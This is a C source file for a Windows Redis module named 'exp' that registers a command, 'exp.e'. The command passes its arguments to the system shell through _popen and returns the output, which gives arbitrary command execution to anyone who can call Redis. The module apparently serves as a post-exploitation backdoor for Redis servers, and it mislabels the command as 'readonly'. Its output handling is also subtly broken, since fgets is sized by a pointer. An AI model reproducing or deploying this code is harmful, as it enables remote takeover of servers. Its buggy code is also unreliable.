#define _CRT_SECURE_NO_WARNINGS
#include <string.h>
#include <stdlib.h>
#include "win32_port.h"
#include "redismodule.h"
#ifdef _WIN32
#define strncasecmp(s1, s2, len) _strnicmp(s1, s2, len)
#define strcasecmp(s1, s2) _stricmp(s1, s2)
#endif



char * join(char*s1, char*s2) {
	char *result = malloc(strlen(s1) + strlen(s2) + 1 + 1);
	if (result == NULL) exit(1);
	strcpy(result, s1);
	strcat(result, " ");
	strcat(result, s2);
	return result;
}


int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {

	char *_cmd;
	size_t _cmd_len;
	size_t size = 1024; //µ¥Î»
	char *all_cmd = "";
	if (argc >= 2)
	{
		for (size_t i = 1; i < argc; i++)
		{
			_cmd = RedisModule_StringPtrLen(argv[i], &_cmd_len);
			all_cmd = join(all_cmd, _cmd);
		}

		FILE *fp = _popen(all_cmd, "r");
		char *buf, *output;
		buf = (char *)malloc(size);
		output = "{";

		while (fgets(buf, sizeof(buf), fp) != 0) {
			output = join(output, buf);
		}
		output = join(output, "}");
		RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
		RedisModule_ReplyWithString(ctx, ret);
		_pclose(fp);
	}
	return REDISMODULE_OK;
}

#ifdef _WIN32
__declspec(dllexport)
#endif
int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
	// Register the module
	if (RedisModule_Init(ctx, "exp", 1, REDISMODULE_APIVER_1) ==
		REDISMODULE_ERR)
		return REDISMODULE_ERR;

	if (RedisModule_CreateCommand(ctx, "exp.e", DoCommand, "readonly", 1, 1, 1) ==
		REDISMODULE_ERR)
		return REDISMODULE_ERR;

	return REDISMODULE_OK;
}